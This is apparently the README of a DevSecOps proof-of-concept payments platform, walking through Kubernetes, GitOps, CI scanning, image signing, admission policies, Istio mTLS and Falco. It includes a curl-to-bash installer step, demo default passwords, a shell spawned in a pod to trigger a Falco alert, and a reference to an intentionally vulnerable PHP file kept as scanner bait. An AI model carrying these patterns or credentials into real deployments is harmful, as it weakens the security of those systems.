# payments-platform-poc

[![OpenSSF Scorecard](https://api.securityscorecards.dev/projects/github.com/twhalley/payments-platform-poc/badge)](https://scorecard.dev/viewer/?uri=github.com/twhalley/payments-platform-poc)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)

Local-first DevSecOps proof-of-concept for a PCI-DSS payments platform: a GitOps-delivered
Kubernetes workload with autoscaling, layered security scanning, software-supply-chain
integrity enforcement, observability, service-mesh mTLS, and infrastructure-as-code
mirroring a GCP/GKE production target.

## What it demonstrates

| Capability | Tool / Pattern |
|---|---|
| Container orchestration | Kubernetes (local kind cluster) |
| App manifests | Kustomize base + dev/prod overlays |
| Platform packages | Helm (ArgoCD, Prometheus, RabbitMQ, Kyverno, Istio, Falco) |
| App as Helm chart | `charts/nginx-app/` — authored from scratch |
| GitOps delivery | ArgoCD (pull-based, prune + self-heal) |
| CI/CD pipeline | GitHub Actions (build → scan → sign → GitOps bump) |
| Cloud CI | Google Cloud Build (`cloudbuild.yaml`) |
| AI-powered scanning | Snyk (DeepCode AI, IaC + containers) |
| Multi-scanner | Trivy (CVE + secrets + misconfigs) |
| Static analysis | GitHub CodeQL (Python) + Semgrep (PHP + Python) + Copilot Autofix |
| Supply chain integrity | syft SBOM + cosign keyless sign + SLSA provenance + Kyverno admission gate |
| Autoscaling | HPA — CPU spike demo with k6 load test |
| Observability | Prometheus + Grafana + Loki (PLG stack — metrics + logs in one pane) |
| Alerting | AlertManager rules: HPA at max, pod crash loop, RabbitMQ queue depth |
| DAST | OWASP ZAP baseline scan on every push — HTML report as CI artifact |
| Service mesh / mTLS | Istio PeerAuthentication (STRICT) + AuthorizationPolicy |
| Policy admission | Kyverno + Pod Security Standards (two independent gates) |
| Runtime security | Falco — syscall-level threat detection |
| Network segmentation | NetworkPolicy default-deny + explicit allow; VPC in Terraform |
| Secrets | K8s Secrets + Workload Identity + Cloud KMS (Terraform) |
| Cloud IaC | Terraform: GKE, VPC, Cloud Armor WAF, KMS, Binary Authorization |
| Async payments flow | RabbitMQ (StatefulSet, PDB) + producer/consumer CronJob |
| Local dev loop | Tiltfile — watch-and-sync on manifest change |
| PCI-DSS mapping | `docs/pci-dss-mapping.md` |

---

## Run anywhere — GitHub Codespaces (recommended)

Codespaces is the primary demo path — no local installs, no Podman/Docker setup, no
"works on my machine" issues. The DevContainer configures everything automatically.

### Step 1 — Launch with the right machine size

The full stack (kind + Istio + Prometheus + RabbitMQ + Kyverno + Loki) needs ~6 GB RAM.

1. Open `https://github.com/twhalley/payments-platform-poc`
2. Click the green **Code** button → **Codespaces** tab
3. Click **...** → **New with options...**
4. Set **Branch** → `master`
5. Set **Machine type** → **4-core · 8 GB RAM · 32 GB storage**
6. Click **Create codespace**

> Do not use "Create codespace" directly — it defaults to 2-core which will OOM when
> Istio and Prometheus are both running. Always use **New with options** to pick 4-core.

### Step 2 — Wait for the DevContainer to build (~3 minutes)

The `post-create.sh` script runs automatically and installs:

| Tool | Version | Used by |
|---|---|---|
| kind | v0.32.0 | Kubernetes cluster |
| k6 | v2.0.0 | HPA load test |
| cosign | v2.2.4 | Supply chain signing |
| syft | latest | SBOM generation |
| grype | latest | SBOM CVE querying |
| Trivy | latest stable | `make security-scan` |
| Kyverno CLI | latest stable | `make kyverno-test` |
| pre-commit | latest | Installed and active |

kubectl and helm are installed by the devcontainer feature. terraform is also available.

> **Docker in Codespaces:** the DevContainer uses `docker-outside-of-docker` (mounts the Codespace VM's Docker socket) rather than `docker-in-docker`. DinD requires privileged mode which Codespaces prebuilds don't support; DooD works transparently — `kind` creates cluster nodes on the host daemon exactly as it would with DinD. `moby: false` is set in [`.devcontainer/devcontainer.json`](.devcontainer/devcontainer.json) because `base:debian` now resolves to Debian trixie (13) where `moby-cli` packages are not yet available; Docker CE CLI is used instead.

### Step 3 — Run the demo

```bash
# Security demos — no cluster needed, run immediately:
make security-scan     # Trivy: secrets + IaC misconfigs + image comparison + SBOM
make kyverno-test      # Policy unit tests — 6 assertions, 3 pass 3 fail

# Full platform:
make cluster           # ~2 min — boots kind cluster, deploys nginx (Kustomize + Helm)
make all               # ~10 min — deploys every component in order
```

### Step 4 — Access the UIs

Port forwards are auto-configured. Click the **Ports** tab in Codespaces (bottom panel):

| Port | Service | Credentials |
|---|---|---|
| 8080 | nginx | — |
| 3000 | Grafana | admin / poc-admin |
| 8443 | ArgoCD | admin / (see `make argocd` output) |
| 15672 | RabbitMQ management | payments / poc-change-me |
| 9090 | Prometheus | — |

### What works and what doesn't in Codespaces

| Component | Status | Notes |
|---|---|---|
| kind cluster, HPA, Kustomize, Helm | ✅ Works | Core demo — uses `kindest/node:v1.32.3` (pinned in `kind-config-codespaces.yaml`; see note below) |
| ArgoCD, Prometheus, Grafana, Loki | ✅ Works | Full observability |
| RabbitMQ, producer/consumer | ✅ Works | Async payment flow |
| Kyverno admission policies | ✅ Works | Including A/B admission demo |
| Istio mTLS | ✅ Works | May be slow to start on 4-core |
| `make security-scan`, `kyverno-test` | ✅ Works | No cluster needed |
| Terraform plan | ✅ Works | No cloud spend |
| Falco modern_ebpf | ⚠️ Skipped | eBPF needs direct kernel access — not available inside a container. `make falco` prints a graceful explanation and points to the README walkthrough instead. |

> **kind node image:** `kind-config-codespaces.yaml` pins `kindest/node:v1.32.3`. The default image that ships with kind v0.32+ (v1.36.x) causes a `connection refused on 6443` failure during CNI installation in the docker-outside-of-docker environment — the API server isn't ready fast enough. v1.32.3 is the stable pinned baseline; update the image field here if you need a specific Kubernetes version.

### GitHub Actions in Codespaces

CI workflows run against the branch on every push. Two things to be aware of:

- **OpenSSF Scorecard** — fires on push to `master` only. To see the live badge and Security tab results, merge the branch. To trigger manually: **Actions → OpenSSF Scorecard → Run workflow**.
- **DAST (ZAP)** — requires a running target URL. It runs automatically on push to `master`; in Codespaces you can trigger it manually against a port-forwarded nginx instance.

> *"I set up a DevContainer so any engineer on the team can clone this and have the full
> stack running in a Codespace in under 5 minutes — no 'works on my machine' issues,
> no tool installation, and the port forwards are pre-wired so the UIs open immediately."*

---

## Local prerequisites (Debian/Ubuntu — skip if using Codespaces above)

### 1. Install tools

```bash
# kubectl
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
sudo install -m 0755 kubectl /usr/local/bin/kubectl && rm kubectl

# helm
curl -fsSL https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash

# kind
curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.32.0/kind-linux-amd64
sudo install -m 0755 kind /usr/local/bin/kind && rm kind

# k6 — binary install (apt repo GPG key is broken on Debian bookworm)
curl -Lo /tmp/k6.tar.gz https://github.com/grafana/k6/releases/download/v2.0.0/k6-v2.0.0-linux-amd64.tar.gz
tar -xzf /tmp/k6.tar.gz -C /tmp
sudo install -m 0755 /tmp/k6-v2.0.0-linux-amd64/k6 /usr/local/bin/k6
# If you previously tried the apt repo, clean it up:
# sudo rm -f /etc/apt/sources.list.d/k6.list /usr/share/keyrings/k6-archive-keyring.gpg
```

### 2. Rootful Podman for kind — tradeoff

The setup script uses `sudo kind` (rootful Podman). Rootless Podman requires `Delegate=yes`
in systemd and a full session restart, which adds friction to a demo.

**Why rootful is fine here:** the security boundary that matters is inside the cluster —
Kyverno, NetworkPolicies, Istio mTLS — not the container runtime on the host.

**In production:** GKE handles cgroup delegation transparently (managed control plane,
containerd not Podman). On self-managed clusters you'd configure rootless with `Delegate=yes`.
A compromised rootful container has root on the host; a rootless one does not.

### 3. Set Podman provider (add to `~/.bashrc` or `~/.zshrc`)

```bash
export KIND_EXPERIMENTAL_PROVIDER=podman
```

---

## GitHub Actions — secrets and pipeline setup

### Required secrets

GitHub repo → **Settings → Secrets and variables → Actions → New repository secret**

| Secret | Required | Where to get it | Used by |
|---|---|---|---|
| `SNYK_TOKEN` | **Yes — add this** | [snyk.io](https://snyk.io) → Account Settings → API Token (free tier) | `ci.yaml` — Snyk IaC + DeepCode SAST job |
| `GITHUB_TOKEN` | Auto-provided | GitHub injects this automatically — no setup needed | GHCR push, SARIF upload, cosign OIDC signing |

That is the complete list. Only one secret requires manual setup.

### Why GITHUB_TOKEN is enough for signing

`GITHUB_TOKEN` is an ephemeral credential GitHub creates for each workflow run.
The CI workflow requests exactly the permissions it needs and nothing more:

```yaml
permissions:
  contents: read          # checkout the repo
  packages: write         # push image to GHCR
  security-events: write  # upload SARIF to GitHub Security tab
  id-token: write         # cosign keyless signing via GitHub OIDC
```

`id-token: write` lets cosign request a short-lived OIDC token from GitHub's identity
provider — this replaces a long-lived signing key entirely. No key to create, rotate,
store, or leak.

### Optional: GCP cloud deployment

If you wire up real `terraform apply` or GKE deployment, add these:

| Secret | How to get it |
|---|---|
| `GCP_PROJECT_ID` | GCP Console → project selector → Project ID |
| `GCP_WORKLOAD_IDENTITY_PROVIDER` | Terraform output after provisioning a Workload Identity pool |

Use Workload Identity Federation — no GCP service account JSON key files. The workflow
proves its GitHub identity to GCP via OIDC, the same mechanism cosign uses. This is
the `terraform/gke.tf` approach already provisioned in this repo.

### One-time setup steps

1. Add `SNYK_TOKEN` secret (above)
2. Enable CodeQL — GitHub repo → Security → Code scanning → Set up → Advanced
3. Set up branch protection (see below)
4. Push a commit to `master` or open a PR — the Actions tab shows the pipeline running

**Every PR runs:** lint → Snyk IaC → CodeQL (Python) → Semgrep (PHP + Python) → Trivy image scan (fails on CRITICAL/HIGH patchable CVEs)

**Every master merge additionally runs:** cosign keyless sign → syft SBOM → SLSA provenance → GitOps bump PR opened on `gitops/bump-{sha}` branch

> *"The pipeline is pinned — `snyk/actions/iac@1.1.2`, `trivy-action@0.24.0` — not `@master`.
> Mutable refs are a supply chain attack vector: the action could change between runs.
> Pinning to a version means what ran yesterday runs the same way today."*

---

## Branch protection — master

Branch protection enforces the principle that **no code reaches production without passing
all security gates**. It maps directly to:

- PCI-DSS Req 6.5 — all changes reviewed and tested before deployment
- ISO 27001 A.8.4 — access to source code is controlled
- OpenSSF Scorecard "Branch-Protection" and "Code-Review" checks

### Rules applied to `master`

| Rule | Setting | Why |
|---|---|---|
| Require pull request | ✅ Enabled | No direct pushes — all changes via PR |
| Required approving reviews | 1 | Peer review before merge (Code-Review check) |
| Dismiss stale reviews | ✅ Enabled | New commits invalidate existing approval |
| Require status checks to pass | ✅ Enabled | CI gate must be green before merge |
| Require branches to be up to date | ✅ Enabled | PR must include latest master before merge |
| Required checks | `Lint Kustomize + Helm`, `Snyk IaC Scan`, `CodeQL Analysis`, `Build Image + Trivy Scan` | All four pre-merge jobs |
| Require conversation resolution | ✅ Enabled | No unresolved review comments at merge |
| Allow force pushes | ❌ Disabled | Prevents history rewriting on master |
| Allow deletions | ❌ Disabled | Master cannot be deleted |

> `sign` and `deploy` jobs are excluded from required checks — they only run
> after merge (they are gated with `if: github.event_name != 'pull_request'`).

### Apply via GitHub CLI (run once in Codespaces — `gh` is pre-authenticated)

```bash
gh api \
  --method PUT \
  -H "Accept: application/vnd.github+json" \
  /repos/twhalley/payments-platform-poc/branches/master/protection \
  --input - <<'EOF'
{
  "required_status_checks": {
    "strict": true,
    "contexts": [
      "Lint Kustomize + Helm",
      "Snyk IaC Scan",
      "CodeQL Analysis",
      "Build Image + Trivy Scan"
    ]
  },
  "enforce_admins": false,
  "required_pull_request_reviews": {
    "dismiss_stale_reviews": true,
    "require_code_owner_reviews": true,
    "required_approving_review_count": 1
  },
  "restrictions": null,
  "allow_force_pushes": false,
  "allow_deletions": false,
  "required_conversation_resolution": true
}
EOF
```

`enforce_admins: false` means you (the repo owner) can bypass the rules when needed
for the demo. Set to `true` in a real team environment.

### Or apply via GitHub UI

1. Repo → **Settings → Branches → Add branch protection rule**
2. **Branch name pattern:** `master`
3. Tick **Require a pull request before merging** → set **Required approving reviews: 1**
4. Tick **Dismiss stale pull request approvals when new commits are pushed**
5. Tick **Require status checks to pass before merging** → tick **Require branches to be up to date**
6. Search and add each required check: `Lint Kustomize + Helm`, `Snyk Scan (code + IaC)`, `CodeQL Analysis`, `Build Image + Trivy Scan`
7. Tick **Require conversation resolution before merging**
8. Tick **Do not allow force pushes** and **Do not allow deletions**
9. Click **Create**

> Status checks only appear in the search box after they have run at least once.
> If the list is empty, push a commit to a branch and open a PR first, then return here.

### CODEOWNERS

[`CODEOWNERS`](CODEOWNERS) requires `@twhalley` to review every PR — enforced
automatically when **Require review from Code Owners** is enabled in branch protection.
This satisfies the OpenSSF Scorecard "Code-Review" check.

---

## Repository security settings

All settings below are applied to this repo. They are documented here so the
configuration is auditable from the same source of truth as the code.

### GitHub Security features

| Feature | Status | How it's enabled |
|---|---|---|
| **Dependabot version updates** | ✅ Enabled | [`.github/dependabot.yml`](.github/dependabot.yml) — weekly PRs for Actions, Docker, pip, Terraform, npm |
| **Dependabot security updates** | ✅ Enabled | Raises PRs when a dependency has a published CVE — requires human review before merge |
| **Dependabot auto security fixes** | ❌ Intentionally disabled | Auto-merging security patches without review is not appropriate for a payments platform. All fixes go through the standard PR + CI gate process. |
| **CodeQL (GHAS)** | ✅ Enabled | `.github/workflows/ci.yaml` — Python SAST; SARIF uploaded to Security tab on every push |
| **Semgrep OSS** | ✅ Enabled | `.github/workflows/ci.yaml` — PHP + Python SAST (`p/php` + `p/python`); SARIF to Security tab |
| **Secret scanning** | ✅ Enabled | GitHub Push Protection — blocks pushes containing detected secrets |
| **Private vulnerability reporting** | ✅ Enabled | [`SECURITY.md`](SECURITY.md) — reports via GitHub Security Advisories |
| **OpenSSF Scorecard** | ✅ Enabled | `.github/workflows/scorecard.yml` — fires on push to master + weekly cron, badge in README |

> To enable Dependabot security features on a new fork, run:
> ```bash
> gh api --method PUT /repos/{owner}/{repo}/vulnerability-alerts
> gh api --method PUT /repos/{owner}/{repo}/automated-security-fixes
> ```

### Required GitHub Actions secret

| Secret | Where to get it | Effect if missing |
|---|---|---|
| `SNYK_TOKEN` | [snyk.io](https://snyk.io) → Account Settings → API Token (free) | Snyk IaC scan step is skipped with a warning; all other CI gates still run |

**Add it:** repo → **Settings → Secrets and variables → Actions → New repository secret** → name: `SNYK_TOKEN`.

Once added, Snyk IaC scan results appear in the **Security → Code scanning** tab alongside CodeQL and Trivy findings.

---

## Security audit — what was found and fixed

A full audit was run against this project. Summary of findings and resolutions:

### Fixed (Critical)

| Finding | Fix |
|---|---|
| `snyk/actions/iac@master` — mutable ref | Pinned to commit SHA `9adf32b` (v1.0.0) |
| `trivy-action@master` — mutable ref | Pinned to commit SHA `ed142fd` (v0.36.0) |
| `continue-on-error: true` on security scans | Removed — CRITICAL/HIGH now fails the build |
| `python:3.12-alpine` mutable image tag | Pinned to `3.12.9-alpine3.21` |
| `aquasec/trivy:latest` in Cloud Build | Pinned to `0.51.0` |
| Consumer `readOnlyRootFilesystem: false` | Fixed to `true` + `emptyDir` for `/tmp` |
| Grafana password committed to values file | Removed — passed via `--set` at install time only |

### Fixed (High)

| Finding | Fix |
|---|---|
| NetworkPolicy ingress had no `from:` clause | Restricted to `ingress-nginx` + `istio-system` namespaces |
| No `imagePullPolicy` on base deployment | Added `IfNotPresent` explicitly |
| No PodDisruptionBudget for nginx | Added `k8s/base/pdb.yaml` (`minAvailable: 1`) |
| No NetworkPolicy for RabbitMQ egress | Added `k8s/rabbitmq/networkpolicy.yaml` (port 5672 only) |
| Prometheus retention 7 days | Increased to 30 days (PCI-DSS audit trail) |

### Accepted trade-offs (Medium/Low — documented, not production blockers)

| Finding | Status |
|---|---|
| Kyverno policies scoped to specific namespaces only | Acceptable for PoC; production would scope cluster-wide |
| Terraform API endpoint `enable_private_endpoint: false` | Documented — needed for demo access; production would use bastion |
| KMS rotation at 90 days | Within PCI-DSS tolerance; 30 days is stricter but optional |
| RabbitMQ default permissions `.*` | Acceptable for PoC; production would scope per queue family |
| ArgoCD TLS disabled (`--insecure`) | Local only; production terminates TLS at ingress/mesh layer |

---

## Makefile — what it is and how to use it

A **Makefile** is a build automation tool that groups complex multi-step commands into
short named targets. Instead of remembering 10-flag Helm install commands and the order
to run them in, you run `make rabbitmq` and the Makefile handles the details.

For this PoC the Makefile is the primary demo interface. Every step in the walkthrough
below maps to a single `make` target — run them in order for a full end-to-end demo,
or pick individual targets to demonstrate specific capabilities.

```bash
make help    # list all targets with one-line descriptions
```

### Platform targets (require `make cluster` first)

| Target | What it does |
|---|---|
| `make cluster` | Bootstrap kind cluster + deploy nginx via Kustomize AND Helm (Phases 1–2) |
| `make watch` | Live view of HPA + pod count — open this before `load-test` |
| `make load-test` | k6: ramp 20 → 100 → 200 VUs, triggers HPA scale-out, writes `k6-summary.json` |
| `make argocd` | Install ArgoCD + register the GitOps Application |
| `make prometheus` | Install Prometheus + Grafana (admin / poc-admin) |
| `make loki` | Install Loki + Promtail log aggregation |
| `make alert-rules` | Apply all AlertManager PrometheusRules to Grafana |
| `make rabbitmq` | Install RabbitMQ (3-node quorum) + producer CronJob + consumer Deployment |
| `make kyverno` | Install Kyverno + apply all five admission policies |
| `make istio` | Install Istio + apply mTLS STRICT + AuthorizationPolicy deny-all |
| `make falco` | Install Falco with modern eBPF driver |
| `make terraform-plan` | Validate GCP/GKE IaC — no cloud spend, reads `example.tfvars` |
| `make all` | Run every target above in the correct order |
| `make destroy` | Delete the kind cluster |

### Security demo targets (no cluster required)

| Target | What it does |
|---|---|
| `make security-scan` | Trivy: secrets in source + IaC misconfigs + prod image + vuln image + SBOM grype query |
| `make kyverno-test` | Policy unit tests — validates good pods pass and bad pods fail (no cluster) |
| `make rbac-audit` | `kubectl auth can-i` per service account — shows least-privilege in action |
| `make verify-supply-chain` | `cosign verify` the latest pushed image — proves it came from the pipeline |

---

## Demo walkthrough

Use `make` targets — each maps to one demo step.

```bash
make cluster    # start here — boots the cluster and deploys nginx both ways
```

---

### 1. Cluster and nodes

```bash
kubectl get nodes
kubectl get pods -n payments-dev
kubectl get pods -n payments-helm
```

Two nodes (control-plane + worker). nginx is running in two namespaces, deployed two ways.

> *"Local kind cluster, two nodes — directly mirrors a GKE setup. The role values local dev
> environments; this is the full stack on one machine with no cloud spend."*

---

### 2. Kustomize vs Helm — two delivery paths

```bash
kubectl kustomize k8s/overlays/dev   # render the overlay without applying
kubectl get deployment -n payments-dev dev-nginx-app -o yaml
```

Open `k8s/base/deployment.yaml` and walk through:
- `runAsNonRoot: true` + `runAsUser: 101` — `nginx-unprivileged` image, not root-default `nginx`
- `readOnlyRootFilesystem: true` — three `emptyDir` mounts for paths nginx needs to write
- `allowPrivilegeEscalation: false` + `capabilities: drop: ALL`
- `seccompProfile: RuntimeDefault` — kernel syscall filtering
- `resources.requests.cpu: 25m` — intentionally low so HPA fires fast in the demo
- All three probes: `readinessProbe`, `livenessProbe`, `startupProbe`
- `minAvailable: 1` PodDisruptionBudget — service survives a node drain

```bash
helm list -n payments-helm
helm history nginx-app -n payments-helm    # show versioned release history
```

Open `charts/nginx-app/` — `Chart.yaml`, `values.yaml`, `templates/_helpers.tpl` — authored
from scratch.

> *"Kustomize for our own services: patch-based, no templating, diff-friendly, ArgoCD renders
> it natively. Helm for platform components with versioned releases and `helm rollback`. I can
> show both delivery paths running side-by-side, and I authored this chart rather than just
> consuming one."*

---

### 3. HPA autoscaling — watch pods spawn under load

This is the most visual demo moment. Open **two terminals**.

**Terminal 1 — watch the HPA and pods in real time:**
```bash
make watch
# or: kubectl get hpa,pods -n payments-dev -w
```

What you will see:
```
NAME                             REFERENCE              TARGETS   MINPODS   MAXPODS   REPLICAS
horizontalpodautoscaler/dev-nginx-app   Deployment/dev-nginx-app   5%/50%    2         6         3

NAME                            READY   STATUS    RESTARTS
pod/dev-nginx-app-xxx-aaa       1/1     Running   0
pod/dev-nginx-app-xxx-bbb       1/1     Running   0
pod/dev-nginx-app-xxx-ccc       1/1     Running   0
```

**Terminal 2 — fire the load test:**
```bash
make load-test
# or: kubectl port-forward -n payments-dev svc/dev-nginx-app 8080:80 &
#     k6 run -e TARGET_URL=http://localhost:8080 scripts/load-test.js
```

k6 ramps: **20 VUs → 100 VUs → 200 VUs → 0**. Watch Terminal 1 as this happens:

1. CPU% column climbs past 50% (the HPA threshold)
2. `REPLICAS` jumps: `3 → 5 → 6` within ~15 seconds (the scale-up stabilisation window)
3. New pods appear as `Pending → ContainerCreating → Running`
4. After load stops, replicas drain back to 3 after the 60s scale-down window

k6 output shows:
```
✓ status 200
✓ body contains payments
http_req_duration p(95)=<500ms
```

> *"CPU request is deliberately low at 25 millicores so the HPA fires quickly under demo load.
> Scale-up stabilisation is 15 seconds to respond fast; scale-down is 60 seconds to prevent
> flapping. The PodDisruptionBudget means at least one pod stays up during any node drain —
> you can't accidentally take the service fully offline."*

---

### 4. ArgoCD — GitOps pull-based delivery

```bash
make argocd
kubectl port-forward -n argocd svc/argocd-server 8443:443
```

Open `https://localhost:8443`. Show the app in sync, then open `argocd/application.yaml`:
- `automated.prune: true` — removes resources deleted from git
- `automated.selfHeal: true` — reverts manual `kubectl edit` changes automatically

**Live demo:** make a small change in the dev overlay (e.g. bump replicas), commit and push,
and watch ArgoCD detect drift and reconcile within 3 minutes without any manual `kubectl apply`.

> *"Pull-based GitOps — ArgoCD polls the repo, not the other way around. `selfHeal` means if
> someone makes a manual kubectl change at 2am, ArgoCD reverts it on the next sync. Every
> change to this cluster is a signed Git commit — that's the audit trail for PCI-DSS Req 12."*

---

### 5. GitHub Actions CI pipeline

Open `.github/workflows/ci.yaml` on GitHub and walk through the jobs:

1. **lint** — Kustomize dry-run + `helm lint` before anything builds
2. **snyk** — IaC scan (Terraform + K8s manifests) using the Snyk CLI binary; SARIF uploaded to the GitHub Security tab. If `SNYK_TOKEN` is not set the job exits cleanly with a notice rather than failing.
3. **codeql** — GitHub AI static analysis for Python with Copilot Autofix suggestions on PR diffs
4. **semgrep** — OSS SAST for PHP and Python using the `p/php` + `p/python` rulesets; surfaces findings from `demo/insecure-code/vulnerable_payment.php` (CWE-89, CWE-79, CWE-78, CWE-22, CWE-327) in the Security tab. CodeQL does not support PHP natively — Semgrep fills that gap.
5. **build-scan** — builds the image, Trivy scans for CVEs/secrets/misconfigs, exits 1 on CRITICAL/HIGH (patchable only — `ignore-unfixed: true`)
6. **sign** — cosign keyless signing via GitHub OIDC (no long-lived keys) + syft SBOM attached as OCI attestation; separate `supply-chain.yaml` workflow adds CycloneDX SBOM and GitHub-native SLSA provenance
7. **deploy** — opens a PR on a `gitops/bump-{sha}` branch with the new image tag; ArgoCD picks it up after merge. Branch protection prevents `github-actions[bot]` from pushing directly to master — opening a PR is the correct GitOps promotion pattern. The branch is force-pushed on reruns so the PR stays idempotent; `can_approve_pull_request_reviews` must be enabled in repo Actions settings for PR creation to succeed.

Point at the pinned action versions:
```yaml
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683          # v4.2.2
uses: azure/setup-helm@dda3372f752e03dde6b3237bc9431cdc2f7a02a2          # v5.0.0
uses: docker/build-push-action@f9f3042f7e2789586610d6e8b85c8f03e5195baf    # v7.2.0
uses: github/codeql-action/analyze@8aad20d150bbac5944a9f9d289da16a4b0d87c1e # v4.36.2
```

Every action is pinned to its **commit SHA**, not a version tag. A version tag (`@v4`) is a mutable pointer — any repo owner can push new code to it between runs. A commit SHA is immutable: what ran yesterday runs the same way today. This is the Scorecard `Pinned-Dependencies` check, and it's the difference between supply chain hygiene and a supply chain attack surface.

> *"Seven jobs — three parallel scanners in the SAST layer: Snyk for IaC, CodeQL for Python, Semgrep for PHP. Running multiple independent scanners means I'm not trusting a single vendor's rule set or blind spot. All action SHAs are pinned to commits, not tags — a mutable ref is a supply chain attack vector. The developer sees findings as inline PR annotations before the code merges — that's shift-left in practice."*

---

### 6. Prometheus + Grafana — observability

```bash
make prometheus
kubectl port-forward -n monitoring svc/kube-prometheus-stack-grafana 3000:80
```

Open `http://localhost:3000` — admin / poc-admin.

Navigate to **Dashboards → Kubernetes HPA** (imported automatically, ID 10257). If you ran
the load test in step 3, you'll see the replica count spike and the CPU metric that triggered it.

> *"Observability is how you know about a problem before your customers do. Any pod annotated
> `prometheus.io/scrape: true` is picked up automatically. The Grafana dashboard lets on-call
> see the HPA scale event, CPU utilisation, and request latency in one view."*

---

### 7. RabbitMQ — async payment event flow

```bash
make rabbitmq
```

Watch events flow:
```bash
kubectl logs -n payments-dev -l app.kubernetes.io/name=payment-consumer -f --max-log-requests=3
# [consumer] Processing a3f2c1d0-... £10.00
# [consumer] ACKed a3f2c1d0-...
```

Management UI:
```bash
kubectl port-forward -n payments-dev svc/rabbitmq 15672:15672
# http://localhost:15672  payments / poc-change-me
```

In the UI, show the `payment.authorised` queue filling and draining. Navigate to
**Queues → payment.authorised** to see message rates, consumers, and the dead-letter
queue configured for failed deliveries.

Open `k8s/rabbitmq/values-rabbitmq.yaml`:
- `replicaCount: 3` — quorum; losing 1 node still has a majority
- `k8s/rabbitmq/pdb.yaml` — `minAvailable: 2` ensures quorum survives a node drain

Open `k8s/rabbitmq/producer-job.yaml`:
- `delivery_mode=2` — messages survive a broker restart
- Consumer ACKs only after processing — unACKed messages re-queue on consumer crash

> *"Payment orchestration is inherently async — authorisation, tokenisation, fraud check,
> settlement, CRM update. A broker decouples them: a slow settlement step doesn't block
> the others, a traffic spike queues rather than knocking services over, and a consumer
> crash doesn't lose the payment — the unACKed message re-queues. That's guaranteed
> delivery, which is non-negotiable for payments."*

---

### 8. Kyverno + Pod Security Standards — two admission gates

```bash
make kyverno
```

**Gate 1 — Kubernetes Pod Security Standards (API server level):**
```bash
kubectl label namespace payments-dev \
  pod-security.kubernetes.io/audit=restricted \
  pod-security.kubernetes.io/warn=restricted

# Check for any violations before enforcing:
kubectl get events -n payments-dev --field-selector reason=FailedCreate

# Once clean, enforce:
kubectl label namespace payments-dev pod-security.kubernetes.io/enforce=restricted --overwrite
```

**Gate 2 — Kyverno (admission webhook level):**
```bash
# Try to deploy a non-compliant pod — show it being blocked at the webhook:
kubectl run bad-pod --image=nginx --namespace payments-dev
# Error from server: admission webhook denied the request:
# Containers must set runAsNonRoot: true
```

Two independent gates: PSS enforces at the API server before the request reaches Kyverno.
If one is misconfigured, the other still fires.

Open `kyverno/policies/require-non-root.yaml` — `validationFailureAction: Enforce`.
Open `kyverno/policies/pod-security-standards.yaml` — explains the layered approach.

> *"Two independent admission gates. PSS is built into the API server — no webhook, no
> dependency on a running pod. Kyverno runs as an admission webhook and gives you richer
> policy logic and audit reporting. Together they're defense-in-depth at the scheduling layer."*

---

### 9. Istio mTLS

```bash
make istio
```

Open `istio/peer-authentication.yaml` — `mode: STRICT` — all pods in `payments-dev` must
use mutual TLS. Plaintext is rejected at the sidecar proxy.

Open `istio/authorization-policy.yaml` — deny-all, then explicit allow only for:
- Ingress gateway → nginx on port 8080
- Prometheus → nginx metrics scrape

> *"Istio mTLS covers PCI-DSS Requirement 4: all service-to-service traffic encrypted in
> transit with mutual certificate authentication. The authorization policy implements
> Requirement 7: default-deny, explicit allow only for known service identity pairs.
> If a pod is compromised and tries to talk to another service, its Istio certificate
> won't be in the allow list — the request is dropped at the sidecar."*

---

### 10. Falco — runtime threat detection

```bash
make falco
```

Watch for runtime alerts:
```bash
kubectl logs -n falco -l app.kubernetes.io/name=falco -f
```

Trigger a detection to show it working:
```bash
# Shell into a running pod — Falco detects unexpected terminal shells in containers
kubectl exec -n payments-dev -it $(kubectl get pod -n payments-dev -l app.kubernetes.io/name=nginx-app -o name | head -1) -- /bin/sh
```

Falco will log:
```
Notice A shell was spawned in a container with an attached terminal
  (user=root container=nginx-app image=nginx-unprivileged)
```

> *"Kyverno and PSS prevent bad pods from being scheduled. Falco watches what's happening
> inside running containers at the syscall level. If an attacker gets into a running pod
> and spawns a shell, reads /etc/shadow, or starts a network scan — Falco detects it in
> real time. That's the difference between prevention and detection. You need both."*

---

### 11. Terraform — GCP/GKE infrastructure as code

```bash
make terraform-plan
```

Walk through the plan output and open the files:
- `terraform/gke.tf` — private nodes, Workload Identity, Binary Authorization, Shielded Nodes
- `terraform/vpc.tf` — private subnet, Cloud Armor WAF blocking XSS + SQLi (OWASP rule set)
- `terraform/kms.tf` — KMS envelope encryption, 90-day key rotation, `prevent_destroy` guard

> *"Real Terraform — would apply against GCP as-is. Demonstrated with `terraform plan` to
> avoid live cloud spend. Binary Authorization here is the GCP-native equivalent of the
> Kyverno verifyImages policy: only attested images admitted. KMS + 90-day rotation covers
> PCI-DSS Requirement 3. The `prevent_destroy` lifecycle guard means a `terraform destroy`
> cannot accidentally delete live encryption keys."*

---

### 12. Supply chain integrity — SBOM + signing + admission gate

Open `.github/workflows/ci.yaml` and `.github/workflows/supply-chain.yaml` together.

**The chain:**
1. **syft** — generates SPDX SBOM at build time. Answers "do we ship Log4j?" instantly
2. **cosign keyless** — signs the image using the GitHub Actions OIDC token. No long-lived keys
3. **SLSA provenance** — attestation proving *which pipeline workflow* built the image
4. **Kyverno verifyImages** — verifies the signature at admission time; unsigned = rejected

```bash
kubectl apply -f kyverno/policies/verify-images.yaml

# Try to deploy an unsigned image into the protected namespace:
kubectl run unsigned --image=alpine --namespace payments-dev
# Expected: admission webhook denied — image not signed by your pipeline
```

> *"Scanning tells you whether an image has known vulnerabilities. Supply chain integrity
> answers a different question: is the thing running in my cluster actually what I built,
> or did someone tamper with it between build and deploy? Keyless signing uses the pipeline's
> verified GitHub identity — no keys to rotate or leak. The Kyverno gate runs inside the
> cluster and can't be bypassed by pushing directly to the registry. This is the open-source
> equivalent of GCP Binary Authorization — the 'set you apart' bullet in the JD."*

---

### 13. Loki — log aggregation (PLG stack)

```bash
make loki
```

Add Loki as a Grafana data source:
- Grafana → Connections → Data sources → Add → Loki
- URL: `http://loki-stack:3100`

